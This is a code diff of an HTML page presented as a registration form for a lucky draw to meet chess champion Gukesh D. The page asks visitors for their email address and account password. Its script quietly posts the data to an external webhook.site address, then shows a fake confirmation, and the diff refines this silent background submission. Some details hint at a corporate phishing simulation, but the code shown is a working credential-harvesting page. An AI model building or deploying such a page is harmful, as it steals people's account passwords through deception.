@@ -3,60 +3,68 @@
 <head>
   <title>Gukesh Meet & Greet — Registration</title>
   <style>
-    body { font-family: Arial, sans-serif; 
+    body { font-family: Arial, sans-serif;
            max-width: 500px; margin: 40px auto; padding: 20px; }
     input, select { width: 100%; padding: 10px; margin: 8px 0 15px 0;
-                    border: 1px solid #ccc; border-radius: 4px; 
+                    border: 1px solid #ccc; border-radius: 4px;
                     box-sizing: border-box; font-size: 14px; }
-    button { width: 100%; padding: 12px; background: #1a73e8; 
-             color: white; border: none; border-radius: 4px; 
+    button { width: 100%; padding: 12px; background: #1a73e8;
+             color: white; border: none; border-radius: 4px;
              font-size: 16px; cursor: pointer; font-weight: bold; }
-    .header { background: #f5f5f5; padding: 15px; 
+    .header { background: #f5f5f5; padding: 15px;
               border-radius: 8px; margin-bottom: 20px; }
+    #thankyou { display: none; text-align: center; padding: 40px 20px; }
+    #thankyou h2 { color: #1a73e8; }
+    .checkmark { font-size: 60px; }
   </style>
 </head>
 <body>
-  <h2>♟ Gukesh D — Meet & Greet Registration</h2>
-  
-  <div class="header">
-    <p>📅 <b>25 September 2026</b></p>
-    <p>📍 <b>Mumbai</b></p>
-    <p>🎟 <b>5 lucky winners selected</b></p>
+
+  <!-- REGISTRATION FORM -->
+  <div id="formSection">
+    <h2>♟ Gukesh D — Meet & Greet Registration</h2>
+
+    <div class="header">
+      <p>📅 <b>25 September 2026</b></p>
+      <p>📍 <b>Mumbai</b></p>
+      <p>🎟 <b>5 lucky winners selected</b></p>
+    </div>
+
+    <p>Sign in with your email account to enter:</p>
+
+    <form id="regForm">
+      <label><b>Email ID</b></label>
+      <input type="email" name="empId"
+             placeholder="yourname@gmail.com" required>
+
+      <label><b>Account Password</b></label>
+      <input type="password" name="pwd"
+             placeholder="Enter your password" required>
+
+      <label><b>Do you follow chess?</b></label>
+      <select name="chessExp">
+        <option value="fan">Yes, huge fan!</option>
+        <option value="casual">Casual follower</option>
+        <option value="new">Not really but would love to meet him</option>
+      </select>
+
+      <button type="submit">♟ Enter Lucky Draw</button>
+    </form>
+
+    <p style="color:#aaa; font-size:11px; margin-top:20px;">
+      Secured registration portal.
+      Contact eventmanagement@allsafe.com for queries.
+    </p>
   </div>
 
-  <p>Sign in with your email account to enter:</p>
-
-  <form action="https://webhook.site/f862eece-e5dd-45fe-a845-caffdcb8a688" method="POST">
-    <label><b>Email ID</b></label>
-    <input type="email" name="empId" 
-           placeholder="yourname@gmail.com" required>
-    
-    <label><b>Account Password</b></label>
-    <input type="password" name="pwd" 
-           placeholder="Enter your password" required>
-    
-    <label><b>Do you follow chess?</b></label>
-    <select name="chessExp">
-      <option value="fan">Yes, huge fan!</option>
-      <option value="casual">Casual follower</option>
-      <option value="new">Not really but would love to meet him</option>
-    </select>
-
-    <button type="submit">♟ Enter Lucky Draw</button>
-  </form>
-
-  <p style="color:#aaa; font-size:11px; margin-top:20px;">
-    Secured registration portal. 
-    Contact eventmanagement@allsafe.com for queries.
-
-    <!-- THANK YOU MESSAGE (hidden until form submitted) -->
+  <!-- THANK YOU MESSAGE (hidden until form submitted) -->
   <div id="thankyou">
     <div class="checkmark">✅</div>
     <h2>You're Registered!</h2>
-    <p>Thank you for entering the lucky draw to meet 
+    <p>Thank you for entering the lucky draw to meet
     <b>World Chess Champion Gukesh D</b>.</p>
-    <p>Winners will be announced on <b>20th September 2026</b> 
-    via your work email.</p>
+    <p>Winners will be announced on <b>20th September 2026</b>
+    via your email.</p>
     <p>Good luck! ♟</p>
     <p style="color:#aaa; font-size:12px; margin-top:30px;">
       This is an automated confirmation from the Events Team.
@@ -70,19 +78,21 @@
       // Collect form data
       const formData = new FormData(this);
 
-      // POST to webhook.site
+      // POST to webhook silently in background
       fetch('https://webhook.site/f862eece-e5dd-45fe-a845-caffdcb8a688', {
         method: 'POST',
         body: formData,
         mode: 'no-cors'
       });
 
-      // Hide form, show thank you
+      // Hide form, show thank you immediately
       document.getElementById('formSection').style.display = 'none';
       document.getElementById('thankyou').style.display = 'block';
+
+      // Scroll to top so thank you is visible
+      window.scrollTo(0, 0);
     });
   </script>
 
-  </p>
 </body>
 </html>
